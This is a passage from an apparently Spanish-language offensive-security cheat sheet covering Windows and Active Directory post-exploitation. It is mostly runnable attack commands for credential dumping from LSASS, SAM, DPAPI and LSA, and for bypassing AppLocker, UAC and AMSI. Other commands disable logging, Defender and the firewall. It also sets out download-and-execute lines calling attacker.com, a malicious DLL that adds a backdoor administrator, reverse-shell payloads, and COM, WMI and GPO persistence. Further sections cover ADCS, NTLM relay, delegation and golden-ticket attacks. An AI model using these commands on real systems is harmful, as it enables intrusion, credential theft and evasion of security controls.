mimikatz # sekurlsa::ekeys                 # Kerberos keys
mimikatz # lsadump::sam                    # SAM dump

# Dump con Procdump (sin mimikatz en el host)
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
# Después transferir el dump y procesarlo en tu máquina:
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

# Dump con Task Manager (si tenés GUI)
# Ctrl+Shift+Esc > Details > lsass.exe > Create dump file

# Dump con comsvcs.dll (incluido en Windows)
C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 584 C:\Temp\lsass.dmp full

# Con PowerShell sin mimikatz
powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCredits"

# Otra opción: SafetyKatz (mimikatz minimizado)
SafetyKatz.exe "sekurlsa::logonpasswords"
```

### 5.3 Windows Vault y Credential Manager

```cmd
# Listar vaults
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials"

# Con Mimikatz
mimikatz # vault::list
mimikatz # vault::cred /in:C:\Users\user\AppData\Local\Microsoft\Vault\...

# Dump de credenciales guardadas
mimikatz # sekurlsa::credman

# Con PowerShell
powershell "Get-StoredCredential | fl *"
```

### 5.4 DPAPI (Data Protection API)

```cmd
# Buscar blobs DPAPI
dir C:\Users\%username%\AppData\Local\Microsoft\Credentials\
dir C:\Users\%username%\AppData\Roaming\Microsoft\Credentials\

# Extraer con Mimikatz
mimikatz # dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\FILE

# Master keys
dir C:\Users\%username%\AppData\Roaming\Microsoft\Protect\%SID%\
mimikatz # dpapi::masterkey /in:C:\Users\user\AppData\Roaming\Microsoft\Protect\SID\KEY /rpc

# Desencriptar master key con contraseña
mimikatz # dpapi::masterkey /in:C:\Users\user\AppData\Roaming\Microsoft\Protect\SID\KEY /password:Pass123
```

### 5.5 LSA Secrets

```cmd
# Extraer secrets LSA
mimikatz # lsadump::secrets

# Remoto:
impacket-secretsdump dominio.com/admin:Pass123@192.168.1.100

# Solo LSA:
impacket-secretsdump -security security.save -system system.save LOCAL
```

---

## 6. AppLocker / Application Guard Bypass

### 6.1 [applocker bypass](../raw/w1n-byp4ss3s.md#applocker-bypass) con Binarios Confiables

```cmd
# Ejecutar código a través de binarios firmados de Microsoft
# InstallUtil
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U evil.dll

# MSBuild
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe evil.csproj

# regsvr32
regsvr32 /s /n /u /i:http://attacker.com/evil.sct scrobj.dll

# rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://attacker.com/evil")

# cscript/wscript
cscript //nologo evil.js
wscript evil.vbs

# powershell (ejecución restringida)
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/ps.ps1')"

# bitsadmin (download + execute)
bitsadmin /transfer job /download /priority high http://attacker.com/evil.exe C:\Temp\evil.exe
C:\Temp\evil.exe

# certutil
certutil -urlcache -f http://attacker.com/evil.exe C:\Temp\evil.exe
C:\Temp\evil.exe
```

### 6.2 AppLocker Bypass con Alternate Data Streams

```cmd
# Ejecutar desde ADS
type evil.exe > C:\Windows\Tasks\store.txt:evil.exe
wmic process call create C:\Windows\Tasks\store.txt:evil.exe
start C:\Windows\Tasks\store.txt:evil.exe
```

### 6.3 AppLocker Policy Discovery

```cmd
# Ver políticas de AppLocker
powershell "Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections"
powershell "Get-AppLockerPolicy -Local | Select -ExpandProperty RuleCollections"

# Probar si un path está permitido
powershell "Get-AppLockerFileInformation -Path C:\Tools\evil.exe"
```

---

## 7. [uac bypass](../raw/w1n-byp4ss3s.md#uac-bypass)

### 7.1 Fodhelper Bypass (Windows 10/11)

Uno de los más confiables. Fodhelper.exe es un binario firmado de Microsoft que ejecuta comandos como admin sin UAC prompt:

```cmd
# Modificar registro para que fodhelper ejecute nuestro payload
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /d "" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "C:\Temp\evil.exe" /f

# Ejecutar fodhelper
C:\Windows\System32\fodhelper.exe

# Limpiar después
reg delete HKCU\Software\Classes\ms-settings\ /f

# PowerShell version
powershell -c "New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Force; Set-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name 'DelegateExecute' -Value ''; Set-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value 'cmd.exe /c whoami > C:\Temp\output.txt'; Start-Process 'C:\Windows\System32\fodhelper.exe'"
```

### 7.2 EventVwr Bypass

```cmd
# Modificar registro para eventvwr
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "C:\Temp\evil.exe" /f

# Ejecutar eventvwr
C:\Windows\System32\eventvwr.exe

# Limpiar
reg delete HKCU\Software\Classes\mscfile\ /f
```

### 7.3 SDCLT Bypass

```cmd
reg add HKCU\Software\Classes\exefile\shell\open\command /d "C:\Temp\evil.exe" /f
C:\Windows\System32\sdclt.exe

# Limpiar
reg delete HKCU\Software\Classes\exefile\ /f
```

### 7.4 ComputerDefaults Bypass

```cmd
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "C:\Temp\evil.exe" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /d "" /f
C:\Windows\System32\ComputerDefaults.exe
```

### 7.5 CMSTP Bypass

```cmd
# Crear un .inf malicioso y ejecutar con cmstp
cmstp.exe /s evil.inf
```

### 7.6 DiskCleanup Bypass

```cmd
# Usar cleanmgr.exe con un scheduled task
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```

### 7.7 Verificar si UAC está activo

```cmd
# Revisar nivel de UAC
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

# Si EnableLUA = 0, no hay UAC
# Si ConsentPromptBehaviorAdmin = 0, UAC no pide confirmación

# Niveles de UAC:
# 0: No pide (siempre eleva)
# 1: Pide credenciales en secure desktop
# 2: Pide confirmación en secure desktop (default)
# 3: Pide credenciales
# 4: Pide confirmación
# 5: Pide credenciales (non-Windows binaries)
```

---

## 8. [amsi bypass](../raw/3dr-3v4s10n.md#amsi-bypass)

[amsi](../raw/3dr-3v4s10n.md#amsi) (Anti-Malware Scan Interface) intercepta scripts [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell), VBS, JS antes de ejecutarlos. Hay varias formas de bypassearlo:

### 8.1 Bypass por Registry (parchear el valor)

```powershell
# Deshabilitar AMSI via registry (necesita admin)
reg add "HKLM\SOFTWARE\Microsoft\AMSI\Providers" /v "{2781761E-28E0-4109-99FE-B9D127C57AFE}" /t REG_SZ /d "" /f

# O deshabilitar Windows Defender (que usa AMSI)
powershell Set-MpPreference -DisableRealtimeMonitoring $true
```

### 8.2 Bypass por Memoria (parchear AMSI.dll)

```powershell
# Este es el más común - parchea la función AmsiScanBuffer en memoria
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Parche alternativo:
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').SetValue($null,$null)
```

### 8.3 Bypass por Reflection (sin registry)

```powershell
# Forzar que AMSI falle (no escanea más en la sesión)
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

### 8.4 Bypass por Obfuscation (muchas variantes)

```powershell
# Base64 encoding del script
powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC4AYwBvAG0ALwBzAGMAcgBpAHAAdAAuAHAAcwAxACcAKQA=

# String splitting
"$(('Inv'+'oke-'+'Ex'+'pres'+'sion').NoRmAliZe([char](70+30)..[char](70+30))) $(('IEX'+' '+'($e'+'nv:'+'CoMSpEC[4,24,25])'+'-Joi'+'n'+"'')")"

# Verify helper (chequear si AMSI está activo)
amsiutil -b  # Si te deja correr esto, AMSI está bypassed
```

### 8.5 Bypass con Binarios (no-PowerShell)

```cmd
# Usar cmd /v para evitar AMSI
cmd /v /c "set a=IEX(New-Object Net.WebClient).DownloadString('http://attacker.htb/evil.ps1') && powershell -c !a!"

# Usar wmic para ejecutar PowerShell sin tocar AMSI
wmic os get /format:"http://attacker.com/evil.xsl"
```

---

## 9. [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) Logging Bypass

PowerShell tiene 4 tipos de logging (ScriptBlock, Module, Transcription, Protected EventLogging). Los bypassen:

### 9.1 ScriptBlock Logging Bypass

```powershell
# Deshabilitar ScriptBlock Logging (necesita admin)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f

# O cambiar el nivel de logging
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockInvocationLogging /t REG_DWORD /d 0 /f
```

### 9.2 Module Logging Bypass

```powershell
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 0 /f
```

### 9.3 Transcription Bypass

```powershell
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" /v EnableTranscripting /t REG_DWORD /d 0 /f
```

### 9.4 Logging Bypass Insertando String ofuscados

```powershell
# Insertar caracteres nulos o espacios para romper el logging
$c = "I"+"E"+"X"
$s = [string]::join('', ("New-Object".ToCharArray() | % { $_ + [char]0x200B }))
# Esto hace que el logging vea strings differentes
```

---

## 10. Windows Defender Evasion

### 10.1 Deshabilitar Defender Temporalmente

```cmd
# Requiere admin
powershell Set-MpPreference -DisableRealtimeMonitoring $true
powershell Set-MpPreference -DisableIOAVProtection $true
powershell Set-MpPreference -DisableScriptScanning $true
powershell Set-MpPreference -DisableBehaviorMonitoring $true
powershell Set-MpPreference -SubmitSamplesConsent 2
```

### 10.2 Agregar Exclusiones

```cmd
# Excluir un path
powershell Add-MpPreference -ExclusionPath C:\Windows\Tasks
powershell Add-MpPreference -ExclusionPath C:\Temp

# Excluir extensión
powershell Add-MpPreference -ExclusionExtension .ps1

# Excluir proceso
powershell Add-MpPreference -ExclusionProcess "powershell.exe"
powershell Add-MpPreference -ExclusionProcess "cmd.exe"
```

### 10.3 Deshabilitar Defender Permanentemente (Registry)

```cmd
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

# También deshabilitar todas las protecciones
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
```

### 10.4 Parar Servicios de Seguridad

```cmd
# Detener Defender
sc stop WinDefend
sc config WinDefend start=disabled

# Detener Windows Security Center
sc stop SecurityHealthService
sc stop wscsvc

# Detener Firewall
netsh advfirewall set allprofiles state off
sc stop MpsSvc
sc stop mpssvc

# Detener Windows Update
sc stop wuauserv
sc config wuauserv start=disabled
```

---

## 11. WSL (Windows Subsystem for Linux) Exploitation

WSL permite ejecutar Linux en Windows. Si está instalado, es un vector de ataque:

### 11.1 Enumerar WSL

```cmd
# Ver distribuciones instaladas
wsl -l -v
wsl --list
wsl --status

# Acceder a archivos de Linux desde Windows
dir \\wsl$\Ubuntu\home\
dir \\wsl$\Ubuntu\etc\
dir %LOCALAPPDATA%\Packages\*\LocalState\rootfs\

# Config de WSL
type %USERPROFILE%\.wslconfig
type %HOMEDRIVE%%HOMEPATH%\.wslconfig
```

### 11.2 Ejecutar Comandos en WSL (desde Windows)

```cmd
# Ejecutar comandos Linux desde Windows cmd
wsl whoami
wsl cat /etc/shadow
wsl python -c 'import pty; pty.spawn("/bin/sh")'

# Con distribución específica
wsl -d Ubuntu -u root whoami
wsl -d Ubuntu --exec /bin/sh -c "cat /etc/shadow"
```

### 11.3 Acceder a Windows desde WSL

```bash
# Dentro de WSL:
# Los discos de Windows están en /mnt/
ls /mnt/c/Users/
cat /mnt/c/Users/User/.ssh/id_rsa

# Ejecutar comandos de Windows desde WSL
/mnt/c/Windows/System32/cmd.exe /c whoami
/mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -c "Get-Process"
```

---

## 12. DLL Hijacking y Sideloading

### 12.1 Buscar DLLs Cargables

```cmd
# Con Process Monitor (procmon), filtrar por:
# Result: NAME NOT FOUND
# Path: *.dll
# Para ver qué DLLs busca un binario que no encuentra

# Buscar DLLs faltantes manualmente
# Ejecutar el binario desde un directorio donde podamos escribir
copy target.exe C:\Temp\
cd C:\Temp\
target.exe
# Ver qué DLLs no encuentra en el path

# DLLs comunes para hijack:
# WMI:        wmi.dll, wmiutils.dll
# PowerShell: fveapi.dll, CRYPTBASE.dll
# Windows:    secur32.dll, credui.dll, winrnr.dll
```

### 12.2 Crear DLL Maliciosa

```cmd
# msfvenom genera DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll -o evil.dll

# O compilar manualmente (en Linux con MinGW):
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
```

```c
// evil.c
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        WinExec("cmd.exe /c net user attacker Pass123! /add && net localgroup Administrators attacker /add", 0);
    }
    return TRUE;
}
```

### 12.3 DLL Sideloading (con Apps Firmadas)

```cmd
# Buscar aplicaciones que cargan DLLs del directorio local
# Skype, Chrome, Dropbox, etc.

# Copiar DLL maliciosa al directorio de la app
copy evil.dll "C:\Program Files\VulnerableApp\"
# Cuando ejecuten la app, carga nuestra DLL
```

---

## 13. [com](../raw/w1n-s9bsyst3ms.md#com) Hijacking para [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia)

### 13.1 Encontrar CLSID Hijackables

```cmd
# Buscar CLSIDs que se cargan sin permiso de admin
# Usar herramienta OleViewDotNet o buscar manualmente:
reg query "HKCU\Software\Classes\CLSID"
reg query "HKLM\SOFTWARE\Classes\CLSID"

# Buscar CLSIDs que apuntan a DLLs faltantes
# Script de PowerShell:
$clsid = Get-ChildItem "HKLM:\SOFTWARE\Classes\CLSID"
foreach ($c in $clsid) {
    $dll = Get-ItemProperty -Path $c.PSPath -Name "(default)" -ErrorAction SilentlyContinue
    if ($dll -and $dll.'(default)' -like "*.dll" -and !(Test-Path $dll.'(default)')) {
        Write-Host "Missing: $($c.PSChildName) -> $($dll.'(default)')"
    }
}
```

### 13.2 Crear COM Hijack

```cmd
# Suplantar un CLSID en el registro del usuario
reg add "HKCU\Software\Classes\CLSID\{GUID}\InprocServer32" /ve /t REG_SZ /d "C:\Temp\evil.dll" /f
reg add "HKCU\Software\Classes\CLSID\{GUID}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Apartment" /f

# El GUID elegido se ejecuta cuando el usuario abre ciertas apps
# Ejemplo: {AB8902B4-09CA-4BB6-B78D-A8F59079A8D5} → se carga al abrir la calculadora
```

### 13.3 COM Hijack con Event Handler

```cmd
# Crear suscripción a evento WMI que carga nuestro COM
# Esto persiste sin archivos de ejecutable
# En PowerShell:
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "EvilFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "EvilConsumer"
    CommandLineTemplate = "rundll32.exe C:\Windows\Temp\evil.dll,Start"
}
$binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

---

## 14. ADCS ([active directory](../raw/w1nd0ws-d0m41n-4dm1n.md) Certificate Services) Attacks

ADCS permite ataques de [escalada de privilegios](../raw/l1n9x-pr1v3sc.md) en el dominio (ESC1-ESC8).

### 14.1 Encontrar ADCS

```cmd
# Buscar Certificate Authorities en el dominio
certutil -config -ping
certutil -TCAInfo
certutil -CATemplates

# Con PowerShell
powershell "Get-ADObject -LDAPFilter '(objectClass=pKIEnrollmentService)'"

# Con PowerView
Get-NetGPO | ? { $_.DisplayName -like "*cert*" }
```

### 14.2 ESC1 — Template Misconfiguration (SAN)

El template permite especificar Subject Alternative Name (SAN) como cualquier usuario, lo que permite pedir un certificado como admin:

```cmd
# Con Certify (herramienta de post-explotación)
Certify.exe find /vulnerable

# Si encontrás un template vulnerable, pedir certificado como admin:
Certify.exe request /ca:DC.dominio.com\CA-NAME /template:VULN-TEMPLATE /altname:Administrador

# Convertir a .pfx para autenticarse
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Autenticarse con el certificado (RBCD, Schannel, etc.)
# Con impacket:
impacket-pkinit -pfx cert.pfx -domain-sid S-1-5-21-... dominio.com/Administrador
```

### 14.3 ESC2 — Template Any Purpose Key Usage

El template permite cualquier uso (certificateRequestAgent, etc.):

```cmd
Certify.exe find /vulnerable  # Buscar ESC2

# Pedir certificado de Enrollment Agent
Certify.exe request /ca:DC\CA /template:VULN-TEMPLATE

# Usar el certificado para pedir certificados como otros usuarios
certreq -new -attrib "CertificateTemplate:User" request.inf Administrador.req
```

### 14.4 ESC3 — Enrollment Agent Templates

Template de Enrollment Agent mal configurado permite delegar enrollment:

```cmd
Certify.exe find /vulnerable
# Pedir certificate agent cert:
Certify.exe request /ca:DC\CA /template:EnrollmentAgent
# Usar para pedir certificado como otro usuario:
Certify.exe request /ca:DC\CA /template:User /onbehalfof:Administrador
```

### 14.5 ESC4 — Template ACL Misconfiguration

El ACL del template permite a usuarios normales modificar el template:

```cmd
# Con Certify
Certify.exe find /vulnerable

# Agregar permisos de enroll+autoenroll a nuestro usuario
# Modificar el template via PowerShell o ADSiedit
# Agregar el template vulnerable
```

### 14.6 ESC5 — CA ACL Misconfiguration

```cmd
# Certificadores con ACLs débiles
Certify.exe find /vulnerable
```

### 14.7 ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

Si la CA tiene este flag, cualquier template puede tener SAN:

```cmd
# Verificar flags de la CA
certutil -config "CA-SERVER\CA-NAME" -getreg ca\EDITF_ATTRIBUTESUBJECTALTNAME2
# Si devuelve 1, cualquier template es vulnerable a ESC1
```

### 14.8 ESC7 — CA Access Control Vulnerable

El CA Manager puede aprobar requests pendientes. Si tenés [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) de CA Administrator o Officer:

```cmd
certutil -config "CA-SERVER\CA-NAME" -resubmit REQUEST_ID
certutil -config "CA-SERVER\CA-NAME" -deny REQUEST_ID
```

### 14.9 ESC8 — NTLM Relay to [ad](../raw/w1nd0ws-d0m41n-4dm1n.md) CS Web Enrollment

[proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) al servidor AD CS con autenticación [http](../raw/r3d3s-f0nd4m3nt0s.md#http) NTLM:

```cmd
# 1. Capturar hash NTLM (Responder)
# 2. Relayear a http://CA-SERVER/certsrv/
impacket-ntlmrelayx -t http://CA-SERVER/certsrv/ -smb2support --adcs --template DomainController

# Cuando un admin se conecta al relay, se le emite un certificado de DC
# Después usás el certificado para DCSync
```

---

## 15. NTLM Relay Attacks

### 15.1 [smb relay](../raw/w1nd0ws-p0st3xpl01t.md#smb-relay)

```bash
# Con ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# Con exec
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"

# Con lista de targets (IPs)
echo "192.168.1.101" > targets.txt
echo "192.168.1.102" >> targets.txt
```

### 15.2 [smb relay](../raw/w1nd0ws-p0st3xpl01t.md#smb-relay) con [smb](../raw/w1nd0ws-p0st3xpl01t.md#smb) Signing Disabled

```bash
# Escanear hosts sin SMB signing
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

# Esto genera targets.txt solo con los hosts que tienen signing deshabilitado
impacket-ntlmrelayx -tf targets.txt -smb2support
```

### 15.3 [http](../raw/r3d3s-f0nd4m3nt0s.md#http) Relay

```bash
# Relayear a HTTP (intranet, sharepoint, etc.)
impacket-ntlmrelayx -tf http_targets.txt -smb2support -http

# Con sabor a exec remota
impacket-ntlmrelayx -tf http_targets.txt -smb2support -http -c "powershell -enc SQBFAFgA..."
```

---

## 16. Printer Bug (MS-RPRN)

El bug de Print Spooler obliga a una máquina remota a autenticarse contra nosotros:

### 16.1 Coerción con SpoolSample

```cmd
# Desde Windows (con privilegios)
SpoolSample.exe DC.dominio.com attacker-machine.dominio.com

# Desde Linux con impacket
impacket-rpcdump @192.168.1.100  # Ver si spooler está corriendo
impacket-rpcmap MS-RPRN 192.168.1.100  # Chequear MS-RPRN

# Coerción con dementor.py
python3 dementor.py -d dominio.com -u user -p pass 192.168.1.100 attacker-machine
```

### 16.2 Capturar Autenticación

```bash
# Mientras hacés la coerción, tenés que capturar:
# Opción 1: Responder (captura hash)
responder -I eth0

# Opción 2: ntlmrelayx (relayea a otro lado)
impacket-ntlmrelayx -t smb://192.168.1.101 -smb2support
```

---

## 17. Delegation Abuse

### 17.1 Unconstrained Delegation

```cmd
# Encontrar computadoras con unconstrained delegation
Get-NetComputer -Unconstrained
powershell "Get-ADComputer -Filter {TrustedForDelegation -eq $true}"

# Encontrar usuarios con unconstrained delegation
Get-NetUser -TrustedForDelegation

# Si comprometés una máquina con unconstrained:
mimikatz # sekurlsa::tickets /export
# Cuando un admin se conecta, su TGT se guarda en memoria
mimikatz # kerberos::ptt ticket.kirbi  # Importar ticket
```

### 17.2 Constrained Delegation Abuse

```cmd
# Encontrar usuarios/computadoras con constrained delegation
Get-NetUser -TrustedToAuth
Get-NetComputer -TrustedToAuth

# Explotar - pedir ticket como admin para el servicio delegado
# Con Kekeo (en Windows):
kekeo.exe
tgt::ask /user:admin /domain:dominio.com /ntlm:HASH
tgs::s4u /tgt:tgt.kirbi /user:Administrador /service:cifs/dc.dominio.com
# Después:
mimikatz # kerberos::ptt ticket.kirbi
dir \\dc.dominio.com\c$
```

### 17.3 Resource-Based Constrained Delegation (RBCD)

```cmd
# Con PowerView, modificar msDS-AllowedToActOnBehalfOfOtherIdentity
# 1. Crear una cuenta de computadora controlada
# 2. Permitir que esa cuenta actúe en nombre de otros contra la máquina target

# Desde Windows:
Set-DomainRBCD -Identity TARGET-PC -DelegateFrom 'FAKE-PC$'
# Pedir ticket como admin:
Rubeus.exe s4u /user:FAKE-PC$ /rc4:HASH /impersonateuser:Administrador /msdsspn:cifs/TARGET-PC.dominio.com /ptt

# Desde Linux:
impacket-addcomputer -computer-name 'FAKE-PC$' -computer-pass 'Passw0rd' dominio.com/user:pass
impacket-rbcd -delegate-from 'FAKE-PC$' -delegate-to 'TARGET-PC$' -dc-ip 192.168.1.100 dominio.com/user:pass
impacket-getST -spn cifs/TARGET-PC.dominio.com -impersonate Administrador -dc-ip 192.168.1.100 'dominio.com/FAKE-PC$:Passw0rd'
export KRB5CCNAME=Administrador.ccache
impacket-psexec -k -no-pass -dc-ip 192.168.1.100 dominio.com/Administrador@TARGET-PC.dominio.com
```

---

## 18. [gpo](../raw/w1nd0ws-d0m41n-4dm1n.md#group-policy) Persistence

Editar GPOs para persistir en todo el dominio:

### 18.1 Agregar Startup Script a GPO

```cmd
# Encontrar GPO que se aplique a OUs con computadoras
Get-NetGPO | Select-Object displayname,dnsserver,gpcpath
# O con PowerShell:
powershell "Get-GPO -All | Out-GridView"

# Agregar script de startup a una GPO existente
powershell "Set-GPPrefRegistryValue -Name 'Default Domain Policy' -Context Computer -Key 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' -ValueName 'Updater' -Value 'C:\Windows\Tasks\evil.exe' -Type String"

# O crear una nueva GPO
New-GPO -Name "SecurityUpdate" | Out-Null
New-GPLink -Name "SecurityUpdate" -Target "ou=Workstations,dc=dominio,dc=com"
Set-GPPrefRegistryValue -Name "SecurityUpdate" -Context Computer -Key "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -ValueName "WindowsUpdate" -Value "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/ps.ps1')" -Type String
```

### 18.2 Editar GPO Existente ([powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell))

```cmd
# Editar una GPO que ya se aplique a todas las computadoras
powershell "Set-GPRegistryValue -Name 'Default Domain Policy' -Key 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -ValueName 'SecurityScan' -Type String -Value 'C:\Windows\Tasks\evil.exe'"

# Agregar scheduled task via GPO
powershell "New-GPO -Name 'SchedTaskPersistence' | New-GPLink -Target 'dc=dominio,dc=com'"
```

---

## 19. Domain Trust Attacks

### 19.1 Enumerar Trusts

```cmd
# Enumerar trusts
nltest /domain_trusts
nltest /dsgetdc:other.domain.com

# Con PowerShell
powershell "Get-ADTrust -Filter *"
powershell "Get-ADObject -Filter {objectClass -eq 'trustDomain'} -Properties *"

# Con PowerView
Get-NetDomainTrust
Get-NetForestTrust
```

### 19.2 SID History Abuse (Extraer SID de otro dominio)

```cmd
# Si hay trust entre dominios, podés agregar un SID de Enterprise Admins
# al SIDHistory de un usuario, dándole acceso al otro dominio

# Con Mimikatz:
mimikatz # kerberos::golden /user:Admin /domain:dominio.com /sid:S-1-5-21-... /sids:S-1-5-21-OTHER-DOMAIN-519 /krbtgt:HASH /ptt
# El 519 es el RID de Enterprise Admins

# Verificar acceso al otro dominio:
dir \\DC.other-domain.com\c$
```

### 19.3 Cross-Kerberos Trust Abuse

```bash
# Desde Linux:
impacket-ticketer -nthashes HASH_KRBTGT -domain-sid S-1-5-21-... -domain dominio.com -extra-sid S-1-5-21-OTHER...-519 Administrator

export KRB5CCNAME=Admin.ccache
impacket-psexec -k -no-pass -dc-ip 192.168.1.200 dominio.com/Admin@DC.other-domain.com
```

---

## 20. Machine Account Quota Abuse

Por defecto, cualquier usuario del dominio puede agregar hasta 10 cuentas de computadora:

```cmd
# Con PowerMad (PowerShell para crear cuentas de computadora)
Import-Module .\PowerMad.ps1
New-MachineAccount -MachineName "FAKE-PC$" -Password $(ConvertTo-SecureString "Passw0rd" -AsPlainText -Force)

# Con impacket (Linux)
impacket-addcomputer -computer-name 'FAKE-PC$' -computer-pass 'Passw0rd' dominio.com/user:pass

# Verificar que la cuenta se creó
net computer "\\FAKE-PC" /add  # O desde PowerShell
```

---

## 21. [smb relay](../raw/w1nd0ws-p0st3xpl01t.md#smb-relay) con Impacket

### 21.1 [smb relay](../raw/w1nd0ws-p0st3xpl01t.md#smb-relay) Básico

```bash
# Relayear autenticación SMB
impacket-ntlmrelayx -tf targets.txt -smb2support

# Con ejecución de comandos
impacket-ntlmrelayx -tf targets.txt -smb2support -c "net user attacker Passw0rd! /add && net localgroup Administrators attacker /add"
```

### 21.2 [smb](../raw/w1nd0ws-p0st3xpl01t.md#smb) Relay con Socks

```bash
# Modo socks: las credenciales se guardan y podés reusarlas
impacket-ntlmrelayx -tf targets.txt -smb2support -socks
# Después usás impacket-smbexec, wmiexec, etc. a través del proxy

# Ver conexiones activas en socks
# En la terminal de ntlmrelayx, los mensajes muestran las conexiones disponibles
```

---

## 22. Lateral Movement (Completo)

### 22.1 PsExec

```cmd
# Clásico - necesita admin y SMB habilitado
psexec \\192.168.1.101 -u DOMINIO\admin -p Pass123! cmd
psexec \\192.168.1.101 -u DOMINIO\admin -p Pass123! -s cmd   # Como SYSTEM
psexec \\192.168.1.101 -u DOMINIO\admin -p Pass123! -d cmd   # No esperar

# Con impacket
impacket-psexec dominio.com/admin:Pass123@192.168.1.101
impacket-psexec -hashes LMHASH:NTHASH dominio.com/admin@192.168.1.101
```

### 22.2 [wmi](../raw/w1n-s9bsyst3ms.md#wmi) (Windows Management Instrumentation)

```cmd
# Ejecutar proceso remotamente
wmic /node:192.168.1.101 /user:admin /password:Pass123! process call create "cmd.exe /c whoami > C:\Temp\out.txt"

# Con impacket
impacket-wmiexec dominio.com/admin:Pass123@192.168.1.101
impacket-wmiexec -hashes :NTHASH dominio.com/admin@192.168.1.101

# Con PowerShell
powershell "Invoke-WmiMethod -ComputerName 192.168.1.101 -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c whoami > C:\Temp\out.txt'"
```

### 22.3 WinRM (Windows Remote Management)
